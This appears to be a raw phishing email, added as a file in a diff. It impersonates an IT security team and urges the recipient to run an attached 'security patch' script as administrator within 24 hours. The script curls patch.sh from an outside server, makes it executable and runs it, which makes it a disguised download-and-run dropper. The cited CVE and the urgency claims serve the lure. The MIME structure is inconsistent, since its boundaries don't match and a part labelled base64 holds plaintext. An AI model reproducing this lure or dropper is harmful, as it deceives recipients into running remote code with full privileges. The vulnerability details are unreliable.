@@ -1,0 +1,129 @@
+Received: from server.upgrade-center.com (server.upgrade-center.com [47.104.22.56])
+        by mx.google.com with ESMTPS id dz10-20020a5d550e0000000b001d96d7e8i9
+        for <user@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384);
+        Thu, 12 Mar 2026 08:30:00 -0700 (PDT)
+Date: Thu, 12 Mar 2026 08:30:00 -0700
+From: IT Security Center <it-security@upgrade-center.com>
+Reply-To: patch-support@upgrade-center.com
+To: user@gmail.com
+Subject: =?UTF-8?B?6ZOu7Yip7d6k7tKl7tKl7uOi7tSl7dGj?= - Critical Security Patch Required
+Message-ID: <20260312083000@upgrade-center.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_99999_1010101010"
+X-Mailer: Microsoft Outlook 16.0
+
+------====_Part_99999_1010101010
+Content-Type: multipart/alternative; boundary="----=_SubPart_99999_1010101010"
+
+------=_SubPart_99999_1010101010
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+Dear User,
+
+URGENT: A critical security vulnerability has been discovered in the system that requires immediate patching.
+
+Vulnerability Details:
+- CVE-2026-1847: Remote Code Execution (RCE)
+- Severity: CRITICAL
+- Affected Systems: All Windows/Linux workstations
+- Discovered: March 11, 2026
+
+Without applying this security patch, your system may be compromised by malicious actors. The patch must be installed within 24 hours.
+
+Installation Instructions:
+1. Download the attached security patch script
+2. Run the script with administrator/root privileges
+3. The script will automatically download and install all required updates
+4. Restart your system when prompted
+
+Failure to install this patch may result in:
+- Data theft
+- System takeover
+- Account compromise
+
+Attachment: security_patch_v2.4.1.sh
+
+IT Security Team
+Emergency Hotline: 400-888-9999
+
+------=_SubPart_99999_1010101010
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
+.container { max-width: 650px; margin: 0 auto; background: #ffffff; padding: 30px; }
+.header { background: linear-gradient(135deg, #b71c1c 0%, #d32f2f 100%); color: white; padding: 25px; text-align: center; }
+.critical-box { background: #ffebee; border: 2px solid #d32f2f; padding: 20px; margin: 20px 0; border-radius: 8px; }
+.vuln-table { width: 100%; background: #fafafa; border-radius: 5px; margin: 20px 0; }
+.vuln-table td { padding: 12px; border-bottom: 1px solid #eee; }
+.warning-icon { color: #d32f2f; font-size: 48px; text-align: center; margin: 20px 0; }
+.step-box { background: #e3f2fd; border-left: 4px solid #1976d2; padding: 15px; margin: 15px 0; }
+.consequence { background: #fff3e0; padding: 15px; margin: 20px 0; border-radius: 5px; }
+.consequence li { margin: 8px 0; color: #e65100; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>⚠️ CRITICAL SECURITY ALERT</h1>
+<p>Immediate Action Required</p>
+</div>
+<div class="critical-box">
+<p class="warning-icon">🚨</p>
+<p style="text-align:center; color:#d32f2f; font-size:18px;"><strong>Critical Vulnerability Discovered!</strong></p>
+<p>A remote code execution vulnerability has been found in your system.</p>
+</div>
+<table class="vuln-table">
+<tr><td><strong>CVE ID:</strong></td><td>CVE-2026-1847</td></tr>
+<tr><td><strong>Type:</strong></td><td>Remote Code Execution (RCE)</td></tr>
+<tr><td><strong>Severity:</strong></td><td style="color:#d32f2f; font-weight:bold;">CRITICAL</td></tr>
+<tr><td><strong>Affected:</strong></td><td>All Windows/Linux Workstations</td></tr>
+<tr><td><strong>Deadline:</strong></td><td style="color:#d32f2f;">24 hours</td></tr>
+</table>
+<div class="step-box">
+<p><strong>Installation Steps:</strong></p>
+<ol>
+<li>Download the attached <strong>security patch script</strong></li>
+<li><strong>Run the script</strong> with administrator privileges</li>
+<li>Wait for automatic installation to complete</li>
+<li>Restart your system when prompted</li>
+</ol>
+</div>
+<div class="consequence">
+<p><strong>⚠️ If not patched, you risk:</strong></p>
+<ul>
+<li>Complete system takeover</li>
+<li>Data theft and corruption</li>
+<li>Account compromise</li>
+</ul>
+</div>
+<hr>
+<p style="color:#666; font-size:12px;">Attachment: security_patch_v2.4.1.sh</p>
+<p>IT Security Team<br>Emergency Hotline: 400-888-9999</p>
+</div>
+</body>
+</html>
+
+------=_SubPart_99999_1010101010--
+Content-Type: application/x-sh; name="security_patch_v2.4.1.sh"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="security_patch_v2.4.1.sh"; size=524288
+
+#!/bin/bash
+# Security Patch Script - CVE-2026-1847
+# Download and install critical security updates
+
+echo "Downloading security patch..."
+curl -O http://update-server.security-updates.com/patch.sh
+chmod +x patch.sh
+./patch.sh
+
+------====_Part_99999_1010101010--
+
